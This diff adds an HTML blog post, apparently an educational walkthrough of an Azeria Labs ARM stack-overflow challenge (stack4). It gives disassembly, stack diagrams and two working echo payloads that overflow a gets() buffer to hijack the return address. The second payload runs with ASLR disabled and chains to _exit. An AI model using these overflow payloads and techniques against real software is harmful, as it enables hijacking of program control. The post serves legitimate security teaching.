@@ -1,0 +1,216 @@
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Smashing ARM Stack for Fun - Part V</title>
+  <meta name="description" content="Smashing ARM Stack for Fun - Part V">
+
+  <link href='/css/load-lato-fonts.min.css' rel='stylesheet' type='text/css'>
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      root: "/js/MathJax-2.7.7",
+      extensions: ["tex2jax.js"],
+      jax: ["input/TeX","output/HTML-CSS"],
+      tex2jax: {inlineMath: [["\\(","\\)"]]},
+      TeX: {
+        Macros: {
+          
+        }
+      }
+    });
+  </script>
+  <script src='/js/MathJax-2.7.7/MathJax.js' async></script>
+
+  <script src="/js/jquery-3.6.0.min.js"></script>
+
+  <script src='/js/underscore-1.9.1.min.js' ></script>
+
+  <script src='/js/d3-7.4.2.min.js'></script>
+
+  <script src='/js/venn/venn-0.2.14.min.js'></script>
+  <script src='/js/venn/helper.min.js'></script>
+
+  <script src='/js/fix_syntax_highlight.min.js'></script>
+  <link rel="stylesheet" type="text/css" href="/css/tufte.min.css">
+  <link rel="stylesheet" type="text/css" href="/css/latex.min.css">
+
+  <link rel="canonical" href="https://book-of-gehn.github.io/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V.html">
+
+  <link rel="stylesheet" type="text/css" href="/css/font-awesome-5.min.css">
+
+  <script src='/js/lunr-2.3.9.min.js'></script>
+  <script src='/js/search_index.js'></script>
+  <script src='/js/search.min.js'></script>
+</head>
+<body>
+<header>
+                <hgroup class="header-group">
+        <h1 class="header-title"><a href="/">The Book of Gehn</a></h1>
+                </hgroup>
+                <ul class="header-list">
+                    <li><a href="https://byexamples.github.io">byexample</a></li>
+                    <li><a href="https://bisturi.github.io">bisturi</a></li>
+                    <li>
+                        <a class="raw_link" href="/feed.xml"><img height="16px" width="16px" src="/img/rss-32px.png" /></a>
+                        <a class="raw_link" href="https://github.com/eldipa"><img height="16px" width="16px" src="/img/github.png" /></a>
+                    </li>
+                </ul>
+        
+        
+
+    
+
+    <nav class="group">
+            <form id="blog-search-form">
+                <input type="search" placeholder="+must -not *fuzzy*"></input>
+                <span class="query-error"></span>
+                <span class="controls">
+                    <button type="submit">Filter</button>
+                    <button style="display: none;" id="reset_search" type="reset">Clear</button>
+                </span>
+            </form>
+    </nav>
+
+    <div style="display: none;" id="search_error"></div>
+    <article style="display: none;" class="group" id="search_results">
+    </article>
+</header>
+<article class="group">
+<h1>
+Smashing ARM Stack for Fun - Part V
+</h1>
+<p class="subtitle">
+January 20, 2021
+</p>
+<p><a href="https://github.com/azeria-labs/ARM-challenges">Fifth challenge</a> with a small introduction to <em>process continuation</em>.<!--more--></p>
+<h2 id="planning-the-exploit">Planning the exploit</h2>
+<div class="highlight-candombe"><pre><span></span><code><span class="nf">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">pdisass</span><span class="w"> </span><span class="o">&amp;</span><span class="nv">main</span><span class="w"></span>
+<span class="w"> </span><span class="err">►</span><span class="w"> </span><span class="err">0</span><span class="nf">x10464</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">&gt;</span><span class="w">       </span><span class="nv">push</span><span class="w">   </span><span class="err">{</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="nv">lr</span><span class="err">}</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10468</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span><span class="w">     </span><span class="nv">add</span><span class="w">    </span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="c1">#4</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x1046c</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span><span class="w">     </span><span class="nv">sub</span><span class="w">    </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="c1">#0x48</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10470</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">str</span><span class="w">    </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#-0x48]</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10474</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">str</span><span class="w">    </span><span class="nb">r1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#-0x4c]</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10478</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">sub</span><span class="w">    </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#0x44</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x1047c</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">mov</span><span class="w">    </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="nb">r3</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10480</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span><span class="w">    </span><span class="nb">bl</span><span class="w">     </span><span class="c1">#gets@plt &lt;gets@plt&gt;</span><span class="w"></span>
+
+<span class="w">   </span><span class="err">0</span><span class="nf">x10484</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">mov</span><span class="w">    </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="nb">r3</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10488</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">sub</span><span class="w">    </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#4</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x1048c</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">pop</span><span class="w">    </span><span class="err">{</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="nv">pc</span><span class="err">}</span><span class="w"></span>
+</code></pre></div>
+
+<p><code><span class="highlight-candombe-inline"><span class="nf">sub</span><span class="w"> </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#0x44</span><span class="w"></span></span></code> means that the buffer begins 0x44 bytes from <code><span class="highlight-candombe-inline"><span class="nf">fp</span><span class="w"></span></span></code>, the begin of the stack frame.</p>
+<p>As we saw <a href="/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html">previously</a>, the stack frame includes the <em>previous</em> value of <code><span class="highlight-candombe-inline"><span class="nf">fp</span><span class="w"></span></span></code> but not <code><span class="highlight-candombe-inline"><span class="nf">lr</span><span class="w"></span></span></code> which it is <em>immediately below</em>.</p>
+<p>So a buffer overflow of 0x44 bytes will overwrite the stored <code><span class="highlight-candombe-inline"><span class="nf">fp</span><span class="w"></span></span></code> and an overflow of 0x48 will overwrite <code><span class="highlight-candombe-inline"><span class="nf">fp</span><span class="w"></span></span></code> and <code><span class="highlight-candombe-inline"><span class="nf">lr</span><span class="w"></span></span></code>.</p>
+<p>If we do the latter, the function <code><span class="highlight-candombe-inline"><span class="n">main</span><span class="w"></span></span></code> will jump to our own code on <em>return</em>.</p>
+<p><label for='ClRoZSBsZWZ0IGRpYWdyYW0gc2hvd3MgdGhlIHN0YWNrIGZyb20gbG93ZXIKYWRkcmVzc2VzIChsZWZ0KSB0byBoaWdoZXIgYWRkcmVzc2VzIChyaWdodCkgYW5kIHRoZSBgbWFpbmB7LmNwcH0ncyBhbmQKYF9fbGliY19zdGFydF9tYWluYHsuY3BwfSdzIHN0YWNrIGZyYW1lcyAoYG1haW5gey5jcHB9IGFuZCBgc3RhcnRgey5jcHB9IGZvciBzaG9ydCkKIG1hcmdpbm5vdGVz' class='margin-toggle'> &#8853;</label>
+<input type='checkbox' id='ClRoZSBsZWZ0IGRpYWdyYW0gc2hvd3MgdGhlIHN0YWNrIGZyb20gbG93ZXIKYWRkcmVzc2VzIChsZWZ0KSB0byBoaWdoZXIgYWRkcmVzc2VzIChyaWdodCkgYW5kIHRoZSBgbWFpbmB7LmNwcH0ncyBhbmQKYF9fbGliY19zdGFydF9tYWluYHsuY3BwfSdzIHN0YWNrIGZyYW1lcyAoYG1haW5gey5jcHB9IGFuZCBgc3RhcnRgey5jcHB9IGZvciBzaG9ydCkKIG1hcmdpbm5vdGVz' class='margin-toggle'/>
+<span class='marginnote'>
+The left diagram shows the stack from lower addresses (left) to higher addresses (right) and the <code><span class="highlight-candombe-inline"><span class="n">main</span><span class="w"></span></span></code>’s and <code><span class="highlight-candombe-inline"><span class="n">__libc_start_main</span><span class="w"></span></span></code>’s stack frames (<code><span class="highlight-candombe-inline"><span class="n">main</span><span class="w"></span></span></code> and <code><span class="highlight-candombe-inline"><span class="n">start</span><span class="w"></span></span></code> for short)
+</span></p>
+<div class="highlight-candombe"><pre><span></span><code><span class="w">    </span><span class="nf">main</span><span class="w"> </span><span class="o">--------------</span><span class="nv">v</span><span class="o">------</span><span class="w"> </span><span class="nv">start</span><span class="w"></span>
+<span class="nf">.......</span><span class="w">   </span><span class="nv">fp</span><span class="w">      </span><span class="nv">lr</span><span class="w">   </span><span class="o">|</span><span class="w">  </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w"></span>
+</code></pre></div>
+
+<p>As you can see the <code><span class="highlight-candombe-inline"><span class="nf">fp</span><span class="w"></span></span></code> and <code><span class="highlight-candombe-inline"><span class="nf">lr</span><span class="w"></span></span></code> are stored in the stack as well as an unknown local variables of <code><span class="highlight-candombe-inline"><span class="n">__libc_start_main</span><span class="w"></span></span></code>.</p>
+<p>When the overflow occurs this is the result:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="w">    </span><span class="nf">main</span><span class="w"> </span><span class="o">---------------</span><span class="nv">v</span><span class="o">-----</span><span class="w"> </span><span class="nv">start</span><span class="w"></span>
+<span class="nf">.......</span><span class="w">   </span><span class="nv">fp</span><span class="w">      </span><span class="nv">lr</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">         </span><span class="p">(</span><span class="nv">pre</span><span class="o">-</span><span class="nv">exploit</span><span class="p">)</span><span class="w"></span>
+<span class="w">    </span><span class="nf">main</span><span class="w"> </span><span class="o">---------------</span><span class="nv">v</span><span class="o">-----</span><span class="w"> </span><span class="nv">start</span><span class="w"></span>
+<span class="nf">AAAAAAA</span><span class="w">   </span><span class="nv">BB</span><span class="w">      </span><span class="nv">addr1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">         </span><span class="p">(</span><span class="nv">overflow</span><span class="p">)</span><span class="w"></span>
+</code></pre></div>
+
+<p>No more crazy stuff is needed here, we can jump to <code><span class="highlight-candombe-inline"><span class="n">win</span><span class="w"></span></span></code> (<code><span class="highlight-candombe-inline"><span class="n">addr1</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x1044c</span><span class="w"></span></span></code>) directly.</p>
+<h2 id="exploit-level-1">Exploit level 1</h2>
+<div class="highlight-candombe"><pre><span></span><code>pi@raspberrypi:~$ <span class="nb">echo</span> -ne <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x4c\x04\x01\x00&#39;</span> <span class="p">|</span> ./stack4
+code flow successfully changed
+Segmentation fault
+</code></pre></div>
+
+<p>Yeah! but that segfault looks sloppy.</p>
+<h2 id="a-more-polite-exploit">A more <em>polite</em> exploit</h2>
+<p>Once <code><span class="highlight-candombe-inline"><span class="n">win</span><span class="w"></span></span></code> executes it will pop from the stack the stored <code><span class="highlight-candombe-inline"><span class="nf">lr</span><span class="w"></span></span></code> and set it into <code><span class="highlight-candombe-inline"><span class="nf">pc</span><span class="w"></span></span></code>.</p>
+<p>We didn’t call <code><span class="highlight-candombe-inline"><span class="n">win</span><span class="w"></span></span></code> with <code><span class="highlight-candombe-inline"><span class="nf">bl</span><span class="w"></span></span></code> or similar so the <code><span class="highlight-candombe-inline"><span class="nf">lr</span><span class="w"></span></span></code> was never set correctly and the value pushed in the stack by <code><span class="highlight-candombe-inline"><span class="n">win</span><span class="w"></span></span></code> was garbage.</p>
+<p>When <code><span class="highlight-candombe-inline"><span class="n">win</span><span class="w"></span></span></code> returns will jump to who-knows-where.</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="w">    </span><span class="nf">main</span><span class="w"> </span><span class="o">---------------</span><span class="nv">v</span><span class="o">-----</span><span class="w"> </span><span class="nv">start</span><span class="w"></span>
+<span class="nf">.......</span><span class="w">   </span><span class="nv">fp</span><span class="w">      </span><span class="nv">lr</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">         </span><span class="p">(</span><span class="nv">pre</span><span class="o">-</span><span class="nv">exploit</span><span class="p">)</span><span class="w"></span>
+<span class="w">    </span><span class="nf">win</span><span class="w"> </span><span class="o">----------------</span><span class="nv">v</span><span class="o">-----</span><span class="w"> </span><span class="nv">start</span><span class="w"></span>
+<span class="w">          </span><span class="nf">BB</span><span class="w">      </span><span class="nv">??</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">         </span><span class="p">(</span><span class="nv">win</span><span class="w"> </span><span class="nv">called</span><span class="p">)</span><span class="w"></span>
+<span class="w">                  </span><span class="err">^</span><span class="w"></span>
+<span class="w">                  </span><span class="nf">ret</span><span class="w"> </span><span class="nv">address</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">win</span><span class="w"></span>
+</code></pre></div>
+
+<p>And if we don’t jump to <code><span class="highlight-candombe-inline"><span class="n">win</span><span class="w"></span></span></code> exactly?</p>
+<p>We could jump to the second instruction of <code><span class="highlight-candombe-inline"><span class="n">win</span><span class="w"></span></span></code>: we will be <strong>skipping</strong> the <code><span class="highlight-candombe-inline"><span class="nf">push</span><span class="w"></span></span></code>.</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="nf">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">pdisass</span><span class="w"> </span><span class="o">&amp;</span><span class="nv">win</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x1044c</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">win</span><span class="o">&gt;</span><span class="w">        </span><span class="nv">push</span><span class="w">   </span><span class="err">{</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="nv">lr</span><span class="err">}</span><span class="w"></span>
+<span class="w"> </span><span class="err">►</span><span class="w"> </span><span class="err">0</span><span class="nf">x10450</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">win</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span><span class="w">      </span><span class="nv">add</span><span class="w">    </span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="c1">#4</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10454</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">win</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span><span class="w">      </span><span class="nv">ldr</span><span class="w">    </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">pc</span><span class="p">,</span><span class="w"> </span><span class="c1">#4]</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10458</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">win</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span><span class="w">     </span><span class="nb">bl</span><span class="w">     </span><span class="c1">#puts@plt &lt;puts@plt&gt;</span><span class="w"></span>
+
+<span class="w">   </span><span class="err">0</span><span class="nf">x1045c</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">win</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span><span class="w">     </span><span class="nv">pop</span><span class="w">    </span><span class="err">{</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="nv">pc</span><span class="err">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>In this way we can <em>emulate</em> the <code><span class="highlight-candombe-inline"><span class="nf">push</span><span class="w"></span></span></code> of <code><span class="highlight-candombe-inline"><span class="nf">fp</span><span class="w"></span></span></code> and <code><span class="highlight-candombe-inline"><span class="nf">lr</span><span class="w"></span></span></code> adding 8 bytes to our payload.</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="w">    </span><span class="nf">main</span><span class="w"> </span><span class="o">---------------</span><span class="nv">v</span><span class="o">---------</span><span class="w"> </span><span class="nv">start</span><span class="w"></span>
+<span class="nf">.......</span><span class="w">   </span><span class="nv">fp</span><span class="w">      </span><span class="nv">lr</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nv">??</span><span class="w">    </span><span class="nv">??</span><span class="w">      </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">      </span><span class="p">(</span><span class="nv">pre</span><span class="o">-</span><span class="nv">exploit</span><span class="p">)</span><span class="w"></span>
+<span class="w">    </span><span class="nf">main</span><span class="w"> </span><span class="o">---------------</span><span class="nv">v</span><span class="o">---------</span><span class="w"> </span><span class="nv">start</span><span class="w"></span>
+<span class="nf">AAAAAAA</span><span class="w">   </span><span class="nv">BB</span><span class="w">      </span><span class="nv">addr1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nv">CC</span><span class="w">    </span><span class="nv">addr2</span><span class="w">   </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">      </span><span class="p">(</span><span class="nv">overflow</span><span class="w"> </span><span class="nv">extended</span><span class="p">)</span><span class="w"></span>
+<span class="w">                        </span><span class="nf">v</span><span class="o">---------</span><span class="w"> </span><span class="nv">start</span><span class="w"></span>
+<span class="w">          </span><span class="nf">??</span><span class="w">      </span><span class="nv">??</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nv">CC</span><span class="w">    </span><span class="nv">addr2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nv">??</span><span class="w">   </span><span class="nv">??</span><span class="w">      </span><span class="p">(</span><span class="nv">win</span><span class="w"> </span><span class="nv">called</span><span class="w"> </span><span class="nv">without</span><span class="w"> </span><span class="nv">push</span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="err">------</span><span class="w"> </span><span class="nf">win</span><span class="w"> </span><span class="o">-------------------^</span><span class="w"></span>
+</code></pre></div>
+
+<p>So now we control where <code><span class="highlight-candombe-inline"><span class="n">win</span><span class="w"></span></span></code> will return: <code><span class="highlight-candombe-inline"><span class="n">addr2</span><span class="w"></span></span></code>.</p>
+<h2 id="planning-a-controlled-exit">Planning a controlled exit</h2>
+<p>An ideal situation would make the program continue running after exploiting it, known as <a href="https://azeria-labs.com/process-continuation-shellcode/">process continuation shellcode</a> but it is too complex for now.</p>
+<p>The simplest thing is to call <a href="https://linux.die.net/man/2/_exit"><code><span class="highlight-candombe-inline"><span class="n">_exit</span><span class="w"></span></span></code></a> a thin glib wrapper of <a href="https://man7.org/linux/man-pages/man2/exit_group.2.html"><code><span class="highlight-candombe-inline"><span class="n">exit_group</span><span class="w"></span></span></code></a> syscall that exits the process and its threads.</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="nf">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">pdisass</span><span class="w"> </span><span class="o">&amp;</span><span class="nv">_exit</span><span class="w"></span>
+<span class="w"> </span><span class="err">►</span><span class="w"> </span><span class="err">0</span><span class="nf">xb6f1b934</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">_exit</span><span class="o">&gt;</span><span class="w">       </span><span class="nv">push</span><span class="w">   </span><span class="err">{</span><span class="nb">r7</span><span class="p">,</span><span class="w"> </span><span class="nv">lr</span><span class="err">}</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">xb6f1b938</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">_exit</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span><span class="w">     </span><span class="nv">mov</span><span class="w">    </span><span class="nb">r2</span><span class="p">,</span><span class="w"> </span><span class="nb">r0</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">xb6f1b93c</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">_exit</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span><span class="w">     </span><span class="nv">mov</span><span class="w">    </span><span class="nb">r7</span><span class="p">,</span><span class="w"> </span><span class="c1">#0xf8</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">xb6f1b940</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">_exit</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">svc</span><span class="w">    </span><span class="c1">#0</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">xb6f1b944</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">_exit</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">cmn</span><span class="w">    </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="c1">#0x1000</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">xb6f1b948</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">_exit</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">bhi</span><span class="w">    </span><span class="c1">#_exit+68 &lt;_exit+68&gt;</span><span class="w"></span>
+</code></pre></div>
+
+<p>The <code><span class="highlight-candombe-inline"><span class="nf">svc</span><span class="w"> </span><span class="c1">#0</span><span class="w"></span></span></code> is what it triggers the syscall. In Arm 32bits the instruction is <code><span class="highlight-candombe-inline"><span class="nf">swi</span><span class="w"></span></span></code> but the disassembler renames it to the newer name: <em>supervisor call</em>.</p>
+<p>The syscall number is passed to the kernel via <code><span class="highlight-candombe-inline"><span class="nf">r7</span><span class="w"></span></span></code> as mentioned in <a href="https://man7.org/linux/man-pages/man2/syscall.2.html">man syscall(2)</a>.</p>
+<p>In our case <a href="https://github.com/torvalds/linux/blob/v4.17/arch/arm/tools/syscall.tbl#L265">0xf8 is the syscall number</a> of <a href="https://man7.org/linux/man-pages/man2/exit_group.2.html"><code><span class="highlight-candombe-inline"><span class="n">exit_group</span><span class="w"></span></span></code></a>.</p>
+<h2 id="exploit-level-2">Exploit level 2</h2>
+<p>We are going to cheat a little and disable ASLR so we can hardcode the address of <code><span class="highlight-candombe-inline"><span class="n">_exit</span><span class="w"></span></span></code> (0xb6f1b934)</p>
+<div class="highlight-candombe"><pre><span></span><code>pi@raspberrypi:~$ setarch linux32 --addr-no-randomize /bin/bash
+<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~$ <span class="nb">echo</span> -ne <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x50\x04\x01\x00BBBB\x34\xb9\xf1\xb6&#39;</span> <span class="p">|</span> ./stack4
+code flow successfully changed
+
+<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~$ <span class="nb">echo</span> <span class="nv">$?</span>
+<span class="m">31</span>
+
+<span class="o">(</span>aslr disabled<span class="o">)</span> pi@raspberrypi:~$ <span class="nb">exit</span>
+<span class="nb">exit</span>
+</code></pre></div>
+
+<p>As you can see the return code of the process was 31. I corroborated with a debugger the value of the registers before the syscall and <code><span class="highlight-candombe-inline"><span class="nf">r0</span><span class="w"></span></span></code> was 31 as expected.</p>
+<p>Instead of jumping to <code><span class="highlight-candombe-inline"><span class="n">_exit</span><span class="w"></span></span></code> we could jump before to a piece of code –known as gadget– that sets <code><span class="highlight-candombe-inline"><span class="nf">r0</span><span class="w"></span></span></code> to zero and then jump to <code><span class="highlight-candombe-inline"><span class="n">_exit</span><span class="w"></span></span></code>.</p>
+<p>But that’s for another post.</p>
+</article>
+<span class="print-footer">Smashing ARM Stack for Fun - Part V - January 20, 2021 - Martin Di Paola</span>
+<footer>
+    <hr class="slender">
+    <div class="credits">
+        <span>&copy;
+            Martin Di Paola
+        </span></br>
+            <a class="raw_link" href="/feed.xml"><img height="16px" width="16px" src="/img/rss-32px.png" /></a>
+            <a class="raw_link" href="https://github.com/eldipa"><img height="16px" width="16px" src="/img/github.png" /></a>
+        <br>
+        
+        <a href="mailto:martinp.dipaola@gmail.com">martinp.dipaola@gmail.com</a></span></br> <br>
+        
+    </div>
+</footer>
+</body>
+</html>
